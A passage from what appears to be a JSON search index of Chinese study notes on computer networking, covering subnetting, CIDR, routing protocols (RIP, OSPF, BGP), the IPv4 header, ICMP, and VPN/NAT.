\uff0c\u5c31\u662f\u7b2c\u4e00\u4e2a\u662f\u5b50\u7f51\u53f7\uff08\u5206\u914d\u4e86\u4e24\u4e2a\u5b50\u7f510-1\uff09\u6bcf\u4e2a\u5b50\u7f51\u53ef\u4ee5\u5206\u914d126\u4e2a\u5730\u5740\uff08\u53bb\u6389\u5168\u90e80\u548c1\u7684\u4e24\u4e2a\u5730\u5740\uff0c\u662f\u7f51\u7edc\u5730\u5740\u548c\u5e7f\u64ad\u5730\u5740\uff09\u3002</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p46-434-ipv4","title":"P46 4.3.4 \u65e0\u5206\u7c7b\u7f16\u5740\u7684IPv4\u5730\u5740","text":"<p>\u5728IPV4\u540e\u9762\u52a0\u4e0a\u659c\u7ebf\uff0c\u5728\u659c\u7ebf\u540e\u9762\u5199\u4e0a\u7f51\u7edc\u524d\u7f00\u6240\u5360\u7684\u6bd4\u7279\u6570\u91cf</p> <p>CIDR \u5730\u5740\u5757\uff0c\u65e0\u5206\u7c7b\u57df\u95f4\u8def\u7531\u9009\u62e9\uff1a\u6ca1\u6709ABC\u7c7b\u5730\u5740\u533a\u522b\uff0c\u6ca1\u6709\u5212\u5206\u5b50\u7f51\uff0c\u53ef\u4ee5\u6709\u6548\u5206\u914dIPV4\u7684\u5730\u5740\u7a7a\u95f4\u3002</p> <p>128.14.35.7/20 \u8868\u793a\u7f51\u7edc\u524d\u7f00\u5360\u752820\u6bd4\u7279\uff0c\u4e3b\u673a\u524d\u7f00\u5360\u752832-20=12\u6bd4\u7279</p> <p>\u8def\u7531\u805a\u5408\uff1a\u7f51\u7edc\u524d\u7f00\u8d8a\u957f\uff0c\u5730\u5740\u5757\u8d8a\u5c0f\uff0c\u8def\u7531\u66f4\u5177\u4f53\u3002\u67e5\u8868\u8f6c\u53d1\u65f6\uff0c\u9009\u62e9\u5339\u914d\u7684\u7f51\u7edc\u524d\u7f00\u6700\u957f\u7684\u90a3\u6761\u8def\u7531\u3002</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p47-435-ipv4","title":"P47 4.3.5 IPv4\u5730\u5740\u7684\u5e94\u7528\u89c4\u5212","text":"<p>\u5b9a\u957f\u7684\u5b50\u7f51\u63a9\u7801\uff08FLSM\uff09\u548c\u53d8\u957f\u7684\u5b50\u7f51\u63a9\u7801\uff08VLSM\uff09</p> <p>\u5c31\u662f\u7ed9\u5b9a\u4e00\u4e2a\u5b9e\u9645\u573a\u666f\uff0825\u53f0\u4e3b\u673a\uff09\uff0c\u7136\u540e\u5206\u6790\u4f7f\u7528\u4ec0\u4e48\u5b50\u7f51\u7c7b\u578b\u7b49\uff0c\u7533\u8bf7\u4ec0\u4e48\u7c7b\u578b\u7684IP\u5730\u5740\u3002\u6839\u636e\u5b9e\u9645\u5b50\u7f51\u6570\u91cf\uff0c\u8ba1\u7b97\u9700\u8981\u5212\u5206\u7684\u5b50\u7f51\u6570\u91cf\uff08\u5b50\u7f51\u63a9\u7801\uff092\u7684\u6307\u6570\u3002\u4f18\u5148\u5206\u914d\u4e3b\u673a\u591a\u7684\u5b50\u7f51\u3002</p> <p>\u5b9a\u957f\u7684\u5b50\u7f51\u63a9\u7801\uff1a\u4e0d\u540c\u5b50\u7f51\u4f7f\u7528\u540c\u6837\u7684\u5b50\u7f51\u63a9\u7801\uff0c\u8fd9\u6837\u6bcf\u4e00\u4e2a\u5b50\u7f51\u5206\u914d\u7684\u5730\u5740\u6570\u91cf\u76f8\u540c\uff0c\u53ef\u80fd\u9020\u6210\u5730\u5740\u7684\u6d6a\u8d39\u3002</p> <p>\u53d8\u957f\u7684\u5b50\u7f51\u63a9\u7801\uff1a\u4e0d\u540c\u5b50\u7f51\uff0c\u6839\u636e\u4e3b\u673a\u6570\u91cf\u4e0d\u540c\uff0c\u8bbe\u7f6e\u4e0d\u540c\u7684\u5b50\u7f51\u63a9\u7801\uff0c\u6309\u5e8f\u5206\u914d\uff0c\u8fd9\u6837\u6700\u5927\u5229\u7528\u5730\u5740\u3002</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p48-44-ip","title":"P48 4.4 IP\u6570\u636e\u62a5\u7684\u53d1\u9001\u548c\u8f6c\u53d1\u8fc7\u7a0b","text":"<p>\u53d1\u9001\u8fc7\u7a0b\uff1a\u4e3b\u673a\u53d1\u9001IP\u6570\u636e\u62a5\uff08\u5982\u679c\u540c\u4e00\u4e2a\u7f51\u7edc\uff0c\u76f4\u63a5\u4ea4\u4ed8\uff1b\u5982\u679c\u4e0d\u662f\u540c\u4e00\u4e2a\u7f51\u7edc\uff0c\u5c5e\u4e8e\u7b80\u4ecb\u4ea4\u4ed8\uff0c\u9700\u8981\u4f20\u8f93\u7ed9\u4e3b\u673a\u6240\u5728\u7f51\u7edc\u7684\u7f51\u5173-\u5373\u8def\u7531\u5668\uff0c\u7531\u8def\u7531\u5668\u5e2e\u5fd9\u8f6c\u53d1\uff09</p> <p>\u8f6c\u53d1\u8fc7\u7a0b\uff1a\u8def\u7531\u5668\u8f6c\u53d1IP\u6570\u636e\u62a5\u3002\u8def\u7531\u5668\u8f6c\u53d1IP\u6570\u636e\u62a5\u7684\u8fc7\u7a0b\uff1a\u68c0\u67e5IP\u6570\u636e\u62a5\u9996\u90e8\uff0c\u5982\u679c\u6b63\u786e\uff0c\u8fdb\u884c\u8f6c\u53d1\uff1b\u5982\u679c\u9519\u8bef\uff0c\u4e22\u5f03IP\u6570\u636e\u62a5\uff0c\u62a5\u544a\u539f\u59cb\u4e3b\u673a\u3002\u8def\u7531\u5668\u53ef\u4ee5\u5904\u7406\u5e7f\u64ad\u98ce\u66b4\u3002</p> <p>IP \u5c42\u4e0d\u8d1f\u8d23\u53ef\u9760\u4f20\u8f93\uff0c\u8def\u7531\u5668\u4e0d\u80fd\u786e\u4fdd\u4f20\u8f93\u7684IP\u5206\u7ec4\u4e0d\u4e22\u5931</p> <p>\u4e3b\u673a\u7684\u9ed8\u8ba4\u7f51\u5173\uff0c\u9700\u8981\u914d\u7f6e\u6210\u8def\u7531\u5668\u7684IP\u5730\u5740\uff0c\u8fd9\u6837\u4e3b\u673a\u624d\u80fd\u901a\u8fc7\u8def\u7531\u5668\uff0c\u53d1\u9001IP\u6570\u636e\u62a5\u3002\u5982\u679c\u9ed8\u8ba4\u7f51\u5173\u914d\u7f6e\u9519\u8bef\uff0c\u90a3\u4e48\u65e0\u6cd5\u5c06IP\u5206\u7ec4\u53d1\u9001\u5230\u8def\u7531\u5668\u3002</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p49-45","title":"P49 4.5 \u9759\u6001\u8def\u7531\u914d\u7f6e\u548c\u8def\u7531\u73af\u8def\u95ee\u9898","text":"<p>\u9759\u6001\u8def\u7531\u914d\u7f6e\uff1a\u7528\u6237\u7ed9\u8def\u7531\u5668\u4eba\u5de5\u914d\u7f6e\u8def\u7531\u8868\uff08\u5c0f\u578b\u7f51\u7edc\u4e2d\u4f7f\u7528\uff09</p> <p>\u6bcf\u4e2a\u8282\u70b9\u7684\u8def\u7531\u5668\u6709\u5bf9\u5e94\u7684\u8def\u7531\u8868\uff0c\u8f6c\u53d1\u62a5\u6587\u65f6\uff0c\u9009\u7528\u76ee\u7684\u7f51\u7edc\u524d\u7f00\u6700\u957f\u7684\u8def\u7531\u6761\u76ee\u8fdb\u884c\u8f6c\u53d1\uff08\u4f18\u5148\u7cbe\u786e\u5339\u914d\uff09</p> <p>\u5982\u679c\u9759\u6001\u8def\u7531\u914d\u7f6e\u9519\u8bef\uff0c\u53ef\u80fd\u9020\u6210\u8def\u7531\u73af\u8def\u95ee\u9898\uff08R1\u5230R2\uff0cR2\u5230R1\uff09</p> <p>\u4e3a\u4e86\u9632\u6b62IP\u6570\u636e\u62a5\u8def\u7531\u73af\u8def\u95ee\u9898\uff0c\u5728IP\u62a5\u6587\u9996\u90e8\u8bbe\u7f6e\u4e86\u751f\u5b58\u65f6\u95f4TTL\uff0c\u6bcf\u6b21\u4f20\u64ad\u90fd\u51cf\u5c111\uff0c\u5982\u679cTTL\u51cf\u5c0f\u52300\uff08\u8ba4\u4e3a\u5b58\u5728\u8def\u7531\u73af\u8def\uff09\uff0c\u90a3\u4e48\u5c31\u88ab\u4e22\u5f03\u3002</p> <p>\u5982\u679c\u7531\u4e8e\u7f51\u7edc\u95ee\u9898\uff0c\u9020\u6210\u4e86\u8def\u7531\u8868\u4e2d\u76ee\u6807\u5730\u5740\u4e0d\u5b58\u5728\uff0c\u5c31\u662f\u8def\u7531\u9ed1\u6d1e\uff0c\u8be5\u8def\u7531\u6761\u76ee\u81ea\u52a8\u5931\u6548\u3002</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p50-461-rip","title":"P50 4.6.1 \u8def\u7531\u5668\u548c\u8def\u7531\u4fe1\u606f\u534f\u8baeRIP","text":"<p>RIP \u7279\u70b9\uff1a</p> <p>\u81ea\u9002\u5e94\uff1a\u52a8\u6001\u8def\u7531\u9009\u62e9\uff0c\u9002\u5e94\u7f51\u7edc\u72b6\u6001\u53d8\u5316</p> <p>\u5206\u5e03\u5f0f\uff1a\u4e0d\u540c\u8def\u7531\u5668\u4ea4\u6362\u8def\u7531\u4fe1\u606f</p> <p>\u5206\u5c42\u6b21\uff1a\u6574\u4e2a\u56e0\u7279\u7f51\u5212\u5206\u6210\u5f88\u591a\u5c0f\u7684\u81ea\u6cbb\u7cfb\u7edf\uff08\u5b50\u7f51\u5185\u90e8\u7f51\u5173\u534f\u8baeIGP\uff0c\u5b50\u7f51\u4e4b\u95f4\u5916\u90e8\u7f51\u5173\u534f\u8baeEGP\uff09</p> <p>IGP \u5206\u4e3a\u5f88\u591a\u534f\u8bae\uff08RIP \u8def\u7531\u4fe1\u606f\u534f\u8bae\uff09</p> <p>\u8def\u7531\u5668\u57fa\u672c\u7ed3\u6784 = \u8def\u7531\u9009\u62e9\uff08\u5185\u90e8\u8def\u7531\u8868\u7b97\u6cd5\uff09+\u5206\u7ec4\u8f6c\u53d1\uff08\u8f93\u5165\u8f93\u51fa\u7aef\u53e3\uff0c\u4e0d\u540c\u5c42\u7ea7\u62a5\u6587\u7684\u89e3\u6790\u548c\u5c01\u88c5\uff09\u8def\u7531\u8868\u5bf9\u7f51\u7edc\u62d3\u6251\u8fdb\u884c\u8ba1\u7b97\u4f18\u5316\uff0c\u4ec5\u5305\u62ec\u76ee\u7684\u7f51\u7edc\u5230\u4e0b\u4e00\u8df3\u7684\u6620\u5c04\u3002</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p51-462-rip","title":"P51 4.6.2 RIP\u7684\u57fa\u672c\u5de5\u4f5c\u539f\u7406","text":"<p>RIP \u4f7f\u7528\u8df3\u6570\u8868\u793a\u5230\u8fbe\u76ee\u7684\u7f51\u7edc\u7684\u8ddd\u79bb\uff08\u8def\u7531\u5668\u76f4\u8fde\u7f51\u7edc\u8ddd\u79bb\u4e3a1\uff0c\u4e00\u4e2a\u8def\u5f84\u4e0a\u6700\u591a15\u4e2a\u8def\u7531\u5668\uff0c\u8d85\u8fc715\u5c31\u4e0d\u53ef\u8fbe\uff0c\u4ec5\u9002\u7528\u4e8e\u5c0f\u578b\u4e92\u8054\u7f51\uff09</p> <p>RIP \u8ba4\u4e3a\u7ecf\u8fc7\u8def\u7531\u5668\u6700\u5c11\u662f\u6700\u4f18\u89e3\uff1b\u5f53\u5230\u5e95\u540c\u4e00\u4e2a\u7f51\u7edc\u6709\u591a\u6761\u8def\u7531\u540e\uff0c\u53ef\u4ee5\u8fdb\u884c\u7b49\u4ef7\u8d1f\u8f7d\u5747\u8861\u3002</p> <p>RIP\uff1a\u548c\u76f8\u90bb\u8def\u7531\u5668\u4ea4\u6362\u4fe1\u606f\uff1b\u4ea4\u6362\u81ea\u5df1\u7684\u8def\u7531\u8868\uff0c\u5468\u671f\u6027\u4ea4\u6362\uff08\u4f8b\u598230s\uff09</p> <p>\u8def\u7531\u5668\u521a\u5f00\u59cb\u5de5\u4f5c\u65f6\uff0c\u53ea\u77e5\u9053\u81ea\u5df1\u5230\u76f4\u8fde\u7f51\u7edc\u7684\u8ddd\u79bb\u662f1\uff0c\u4ec5\u548c\u76f8\u90bb\u7684\u8def\u7531\u5668\u5468\u671f\u4ea4\u6362\u5e76\u66f4\u65b0\u8def\u7531\u4fe1\u606f\u3002\u82e5\u5e72\u6b21\u4ea4\u6362\u66f4\u65b0\u540e\uff0c\u6bcf\u4e2a\u8def\u7531\u5668\u77e5\u9053\u5230\u8fbe\u672cAS\u5185\u5404\u4e2a\u7f51\u7edc\u7684\u6700\u77ed\u8ddd\u79bb\u548c\u4e0b\u4e00\u8df3\u5730\u5740\uff08\u6536\u655b\uff09\u3002</p> <p>\u8def\u7531\u8868\u66f4\u65b0\u4e3e\u4f8b\uff1a</p> <ul> <li>\u5982\u679c\u6709\u65b0\u7684\u7f51\u7edc\uff0c\u76f4\u63a5\u6dfb\u52a0\uff1b</li> <li>\u5982\u679c\u5230\u76ee\u6807\u7f51\u7edc\u6709\u65b0\u7684\u8def\u7531\uff0c\u5982\u679c\u65b0\u7684\u8def\u7531\u6709\u4f18\u52bf\uff0c\u4f7f\u7528\u65b0\u7684\u8def\u7531</li> <li>\u5982\u679c\u5230\u76ee\u6807\u7f51\u7edc\u6709\u65b0\u7684\u8def\u7531\uff0c\u5982\u679c\u548c\u5df2\u6709\u76f8\u7b49\uff0c\u8d1f\u8f7d\u5747\u8861</li> <li>\u5982\u679c\u5230\u76ee\u6807\u7f51\u7edc\u6709\u65b0\u7684\u8def\u7531\uff0c\u5982\u679c\u65e7\u7684\u8def\u7531\u6709\u4f18\u52bf\uff0c\u4e0d\u66f4\u65b0</li> </ul> <p>\u574f\u6d88\u606f\u4f20\u7684\u6162\uff1b\u8def\u7531\u73af\u8def\uff08\u5982\u679c\u8def\u7531\u8868\u53d8\u5316\u4e86\uff0c\u7acb\u5373\u53d1\u51fa\u66f4\u65b0\u62a5\u6587\uff0c\u800c\u4e0d\u662f\u7b49\u5f85\u5468\u671f\u6027\u53d1\u51fa\u62a5\u6587\uff09\u5982\u679c\u6709\u8def\u7531\u73af\u8def\uff0c\u663e\u793a\u6700\u5927\u8df3\u6570\u662f15\uff0c\u907f\u514d\u6b7b\u5faa\u73af\u3002</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p52-463-ospf","title":"P52 4.6.3 \u5f00\u653e\u6700\u77ed\u8def\u5f84\u4f18\u5148OSPF","text":"<p>open shortest path first</p> <p>\u4f7f\u7528\u4e86 Dijkstra \u7684\u6700\u77ed\u8def\u5f84\u7b97\u6cd5 SPF\uff0c\u57fa\u4e8e\u94fe\u8def\u72b6\u6001\uff0c\u5e76\u4e0d\u662f\u57fa\u4e8e\u8ddd\u79bb\u5411\u91cf\u7684\uff0c\u8fd9\u4e2a\u7b97\u6cd5\u4fdd\u8bc1\u4e86\u4e0d\u4f1a\u51fa\u73b0\u8def\u7531\u73af\u8def\u3002</p> <p>\u94fe\u8def\u72b6\u6001\uff1a\u672c\u8def\u7531\u5668\u548c\u54ea\u4e9b\u8def\u7531\u5668\u76f8\u90bb\uff0c\u94fe\u8def\u72b6\u6001\u5982\u4f55\uff08\u5e26\u5bbd\uff0c\u65f6\u5ef6\uff0c\u8d39\u7528\u7b49\uff09\u5c31\u662f\u4e00\u4e2a\u6709\u5411\u56fe\uff0c\u4e0d\u540c\u8def\u5f84\u7684\u6743\u91cd\u4e0d\u540c\uff08\u4eba\u4e3a\u8bbe\u7f6e\u6743\u91cd\uff09</p> <p>\u4e0d\u540c\u8def\u7531\u5668\u4e4b\u95f4\u95ee\u5019\u5206\u7ec4\uff0c\u5efa\u7acb\u7ef4\u62a4\u90bb\u5c45\u5173\u7cfb\uff08IP\u6570\u636e\u62a5\uff0c10s\u5468\u671f\u53d1\u9001\uff09\uff0c\u6d4b\u8bd5\u8fde\u63a5\u72b6\u6001\uff0c\u5c06\u72b6\u6001\u5b58\u50a8\u5728 LSDB \u94fe\u8def\u72b6\u6001\u6570\u636e\u5e93\u4e2d\u3002</p> <p>\u8def\u7531\u5668\u57fa\u4e8eLSDB\u8fdb\u884c\u6700\u77ed\u8def\u5f84\u4f18\u5148\u7b97\u6cd5SPF\u8ba1\u7b97\uff0c\u6784\u5efa\u51fa\u5230\u8fbe\u5176\u4ed6\u8def\u7531\u5668\u7684\u6700\u77ed\u8def\u5f84\uff0c\u6784\u5efa\u8def\u7531\u8868\u3002</p> <p>\u5728\u591a\u70b9\u63a5\u5165\u7f51\u7edc\u4e2d\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u6307\u5b9a\u8def\u7531\u5668 DR \u6267\u884c SPF\uff0c\u5176\u4ed6\u975eDR\u7684\u8def\u7531\u5668\uff0c\u53ea\u548cDR\u5efa\u7acb\u90bb\u5c45\u5173\u7cfb\u3002\u8fd8\u6709\u5907\u7528\u5236\u5b9a\u8def\u7531\u5668\uff08BDR\uff09</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p53-464-bgp","title":"P53 4.6.4 \u8fb9\u754c\u7f51\u5173\u534f\u8baeBGP","text":"<p>\u5728\u4e0d\u540c\u7cfb\u7edf\u5185\uff0c\u56fe\u7684\u6743\u91cd\u4e0d\u540c\uff0c\u6240\u4ee5\u4e0d\u80fd\u7528\u4e4b\u524d\u7684\u6a21\u578b\u8ba1\u7b97\u8def\u7531\u8868\u3002</p> <p>\u6240\u4ee5\u4f7f\u7528\u5916\u90e8\u7f51\u5173\u534f\u8bae EGP\uff08BGP \u662f\u5176\u4e2d\u7684\u4e00\u79cd\uff0c\u8fb9\u754c\u7f51\u5173\u534f\u8bae\uff09</p> <p>\u5916\u90e8\u9700\u8981\u8003\u8651\u7efc\u5408\u56e0\u7d20\uff08\u653f\u6cbb\u7ecf\u6d4e\u5b89\u5168\uff09\u4e0d\u4ec5\u8003\u8651\u5e26\u5bbd\u548c\u8d39\u7528</p> <p>\u5728\u8fb9\u754c\u5904\u7684\u8def\u7531\u5668\u53d1\u8d77\u901a\u4fe1\uff08TCP\u62a5\u6587\u6bb5\u901a\u4fe1\uff09</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p54-47-ipv4","title":"P54 4.7 IPv4\u6570\u636e\u62a5\u7684\u9996\u90e8\u683c\u5f0f","text":"<p>\u8fd9\u90e8\u5206\u9898\u76ee\u90fd\u662f\u5927\u9898\uff08\u91cd\u70b9\u638c\u63e1\uff09</p> <p>\u56fa\u5b9a\u90e8\u5206\uff0820\u5b57\u8282\uff09</p> <ul> <li>\u9996\u90e8\u957f\u5ea6\uff1a\u4ee5\u56db\u5b57\u8282\u4e3a\u5355\u4f4d\uff08min 5 max 15\uff09\u6700\u5c0f20\u5b57\u8282\uff08\u53ea\u670920\u5b57\u8282\u7684\u9996\u90e8\uff09\uff0c\u6700\u592760\u5b57\u8282\uff08\u9996\u90e8\u957f\u5ea620+\u53ef\u53d8\u90e8\u520640\uff09</li> <li>\u533a\u5206\u670d\u52a1\uff1a8\u6bd4\u7279\uff0c\u4e0d\u540c\u6570\u503c\u8868\u793a\u63d0\u4f9b\u4e0d\u540c\u7b49\u7ea7\u7684\u670d\u52a1\u8d28\u91cf\uff08\u53ef\u9009\uff09</li> <li>\u603b\u957f\u5ea6\uff0816\u6bd4\u7279\uff09\uff1aIP\u6570\u636e\u62a5\u603b\u957f\u5ea6\uff08\u9996\u90e8+\u6570\u636e\u8f7d\u8377\uff09</li> <li>\u6807\u8bc6\uff1a\u540c\u4e00\u4e2a\u6570\u636e\u62a5\u7684\u4e2a\u5206\u7247\u6570\u636e\u62a5\uff0c\u6807\u8bc6\u76f8\u540c</li> <li>\u6807\u5fd7\uff1aMF 01 \u8868\u793a\u662f\u5426\u5141\u8bb8\u5206\u7247\uff0cDF 01 \u662f\u5426\u662f\u6700\u540e\u4e00\u4e2a\u5206\u7247</li> <li>\u7247\u504f\u79fb\uff1a\u5206\u7247\u6570\u636e\u62a5\u7684\u6570\u636e\u8f7d\u8377\u7684\u504f\u79fb\u91cf\uff08\u5fc5\u987b\u662f\u6574\u6570\uff0c\u4e14\u88ab8\u6574\u9664\uff09</li> </ul> <p>\uff08\u5982\u679cIP\u6570\u636e\u62a5\u5f88\u957f\uff0c\u90a3\u4e48\u5206\u6210\u51e0\u4e2a\u5206\u7247\u6570\u636e\u62a5\uff0c\u6807\u8bc6\uff0c\u6807\u5fd7\uff0c\u7247\u504f\u79fb\u7528\u4e8eIP\u6570\u636e\u62a5\u5206\u7247\uff0c\u6536\u5230\u540e\u518d\u7ec4\u5408\u6210\u5b8c\u6574\u7684\u6570\u636e\u62a5\uff09</p> <ul> <li>\u751f\u5b58\u65f6\u95f4\uff1aTTL \u8df3\u6570\u4e3a\u5355\u4f4d\uff0c\u7ecf\u8fc7\u8def\u7531\u8f6c\u53d1\u540e\u51cf\u5c111\uff0c\u907f\u514d\u8def\u7531\u5faa\u73af\u95ee\u9898</li> <li>\u534f\u8bae\uff1a\u6570\u636e\u90e8\u5206\u662f\u4ec0\u4e48\u534f\u8bae\uff08TCP6\uff0cUDP17\u7b49\uff09</li> <li>\u9996\u90e8\u6821\u9a8c\u548c\uff1a\u68c0\u6d4b\u9996\u90e8\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u662f\u5426\u6709\u5dee\u9519\uff1aIP\u6570\u636e\u62a5\u7ecf\u8fc7\u8def\u7531\u5668\u540e\uff0c\u9700\u8981\u91cd\u65b0\u8ba1\u7b97\u6821\u9a8c\u548c\uff0c\u56e0\u4e3aTTL\uff0c\u7247\u504f\u79fb\u7b49\u4f1a\u91cd\u65b0\u53d8\u5316\uff0c\u6240\u4ee5\u9700\u8981\u91cd\u65b0\u6821\u9a8c\u3002</li> <li>\u6e90IP\u5730\u5740\u548c\u76ee\u7684IP\u5730\u5740</li> </ul> <p>\u53ef\u53d8\u90e8\u5206\uff0840\u5b57\u8282\uff09\uff1a\u957f\u5ea6\u4ece1-40\u4e0d\u7b49\uff0c\u7528\u6765\u62cd\u9519\u6d4b\u91cf\u7b49\uff0c\u5b9e\u9645\u4f7f\u7528\u4e0d\u591a\uff08\u589e\u52a0\u4e86\u8def\u7531\u5668\u5904\u7406IP\u6570\u636e\u5305\u7684\u5f00\u9500\uff09</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p55-48-icmp","title":"P55 4.8 \u7f51\u9645\u63a7\u5236\u62a5\u6587\u534f\u8baeICMP","text":"<p>\u4e3a\u4e86\u6709\u6548\u8f6c\u53d1IP\u6570\u636e\u62a5\uff0c\u63d0\u4f9b\u6210\u529f\u4ea4\u4ed8\u7684\u673a\u4f1a\uff0c\u7f51\u9645\u5c42\u4f7f\u7528\u4e86\u7f51\u9645\u63a7\u5236\u62a5\u6587\u534f\u8bae\uff08internet control message protocol\uff09\uff1b\u4e3b\u673a\u6216\u8005\u8def\u7531\u5668\u4f7f\u7528\u8fd9\u4e2a\u534f\u8bae\u53d1\u9001\u5dee\u9519\u62a5\u544a\u62a5\u6587\u548c\u8be2\u95ee\u62a5\u6587\u3002</p> <p>\u5dee\u9519\u62a5\u544a\u62a5\u6587\uff1a\u5f53\u8def\u7531\u5668\u6216\u8005\u4e3b\u673a\u65e0\u6cd5\u4ea4\u4ed8\u6570\u636e\u62a5\u65f6\uff0c\u5c31\u5411\u53d1\u9001\u70b9\u53d1\u9001 ICMP \u4e0d\u53ef\u8fbe\u62a5\u6587\uff08\u4f8b\u5982\u7ec8\u70b9\u4e0d\u53ef\u8fbe\uff0c\u8d85\u65f6\u7b49\uff09\u53c2\u6570\u64cd\u4f5c\u62a5\u6587\uff08\u6821\u9a8c\u53d1\u73b0\u53c2\u6570\u9519\u8bef\uff09\u5bf9\u4e8e ICMP \u5dee\u9519\u62a5\u6587\u4e0d\u518d\u53d1\u9001 ICMP \u5dee\u9519\u62a5\u544a\u62a5\u6587\uff1b\u7279\u6b8a\u76840.0.0.0 \u4e0d\u53d1\u9001 </p> <p>\u8be2\u95ee\u62a5\u6587\uff1a\u56de\u9001\u8bf7\u6c42\u548c\u56de\u7b54\uff0c\u65f6\u95f4\u6233\u8bf7\u6c42\u548c\u56de\u7b54\uff08\u8bf7\u67d0\u4e2a\u4e3b\u673a\u56de\u590d\u4e00\u4e0b\u65f6\u95f4\uff09</p> <p>\u4f8b\u5982\uff1a\u5206\u7ec4\u7f51\u95f4\u63a2\u6d4b\uff1aPING \u547d\u4ee4\uff08\u68c0\u6d4b\u4e3b\u673a\u548c\u8def\u7531\u5668\u7684\u8054\u901a\u884c\uff0c\u5e94\u7528\u5c42\u76f4\u63a5\u4f7f\u7528\u7f51\u9645\u5c42\u7684ICMP\uff0c\u6ca1\u6709\u8d70\u8fd0\u8f93\u5c42\u7684TCP\u6216\u8005UDP\uff09</p> <p>\u8ddf\u8e2a\u8def\u7531\uff1atraceroute \u6d4b\u8bd5IP\u6570\u636e\u62a5\u4ece\u6e90\u4e3b\u673a\u5230\u8fbe\u76ee\u7684\u4e3b\u673a\uff0c\u7ecf\u8fc7\u54ea\u4e9b\u8def\u7531\u5668\uff08Windows \u4f7f\u7528 tracert \u76f4\u63a5\u8d70 ICMP\uff0cUnix \u4f7f\u7528 traceroute \u8d70 UDP\uff09</p>"},{"location":"ebook-network-basic/04%20%E7%BD%91%E7%BB%9C%E5%B1%82/#p56-49-vpnnat","title":"P56 4.9 \u865a\u62df\u4e13\u7528\u7f51VPN\u2014\u2014\u7f51\u7edc\u5730\u5740\u8f6c\u6362NAT","text":"<p>Virtual Private Network \u865a\u62df\u4e13\u7528\u7f51\uff1a\u4e24\u4e2a\u79c1\u6709\u7684\u7f51\u7edc\u65e0\u6cd5\u901a\u4fe1\uff0c\u6240\u4ee5\u5229\u7528\u516c\u7528\u7684\u56e0\u7279\u7f51\u4f5c\u4e3a\u67d0\u4e2a\u79c1\u6709\u7f51\u7edc\u5185\u90e8\u7684\u6865\u6881\uff0c\u5b9e\u73b0\u8bbf\u95ee\u53e6\u4e00\u4e2a\u79c1\u6709\u7684\u7f51\u7edc\uff08\u5185\u7f51\u7a7f\u900f\uff09</p> <p>\u5185\u90e8\u4e3b\u673a\uff0c\u53d1\u9001\u6d88\u606f\u5230\u5185\u90e8\u7684\u8def\u7531\u5668\uff0c\u7136\u540e\u8def\u7531\u5668\u8f6c\u6362IP\u540e\uff0c\u901a\u8fc7\u516c\u7f51\u8bf7\u6c42\u53e6\u4e00\u4e2a\u79c1\u6709\u7f51\u7edc\u7684\u8def\u7531\u5668\uff0c\u7ecf\u8fc7\u8f6c\u53d1IP\u540e\uff0c\u8bbf\u95ee\u53e6\u4e00\u4e2a\u4e3b\u673a\u7684\u8d44\u6e90\u3002</p> <p>IP \u96a7\u9053\u6280\u672f\uff1a\u5728\u5bb6\u8bbf\u95ee\u6821\u56ed\u7f51\u5185\u7f51\u7684\u670d\u52a1</p> <p>\u6b64\u65f6\u9700\u8981\u4f7f\u7528NAT\u534f\u8bae\uff08\u7f51\u7edc\u5730\u5740\u8f6c\u6362 network address translation\uff09\u5185\u7f51\u4e0b\u7684\u7535\u8111\u5bf9\u5916\u90e8\u901a\u4fe1\u65f6\uff0c\u663e\u793a\u7684\u662f\u8def\u7531\u5668\u7684\u5916\u90e8IP\u3002</p> <p>NAPT\uff1a\u7f51\u7edc\u5730\u5740\u4e0e\u7aef\u53e3\u53f7\u8f6c\u6362\uff1a\u5927\u90e8\u5206\u5e94\u7528\u4f7f\u7528TCP\u6216\u8005UDP\u4f20\u9001\u6570\u636e\uff0c\u53ef\u4ee5\u5229\u7528\u8fd0\u8f93\u5c42\u7684\u7aef\u53e3\u53f7\u548cIP\u5730\u5740\uff0c\u4e00\u8d77\u8fdb\u884c\u8f6c\u6362\u3002\u7528\u4e00\u4e2a\u5168\u7403IP\u5730\u5740\u53ef\u4ee5\u4f7f\u5f97\u62e5\u6709\u591a\u4e2a\u672c\u5730\u5730\u5740\u7684\u4e3b\u673a\uff0c\u540c\u65f6\u548c\u56e0\u7279\u7f51\u4e0a\u7684\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\u3002</p> <p>\u5916\u7f51\u4e3b\u673a\u4e0d\u80fd\u9996\u5148\u53d1\u8d77\u901a\u4fe1\uff1a\u6536\u5230\u6765\u81ea\u5916\u7f51\u7684IP\u6570\u636e\u62a5\u540e\uff0c\u5728 NAPT \u8f6c\u6362\u8868\u4e2d\uff0c\u627e\u4e0d\u5230\u5bf9\u5e94\u7684\u8bb0\u5f55\u3002\u5982\u679c\u662f P2P \u5e94\u7528\u9700\u8981\u5916\u7f51\u4e3b\u673a\u4e3b\u52a8\u901a\u4fe1\uff0c\u9700\u8981\u7279\u6b8a\u7684\u6280\u672f\u5b9e\u73b0\u5185\u7f51\u7a7f\u8d8aNAT\u3002</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/","title":"05 \u8fd0\u8f93\u5c42","text":""},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#_1","title":"\u7b2c\u4e94\u7ae0 \u8fd0\u8f93\u5c42","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 16231  \u9605\u8bfb33\u5206\u949f</p>"},{"location":"ebook-network-basic/05%20%E8%BF%90%E8%BE%93%E5%B1%82/#p57-51","title":"P57 5.1 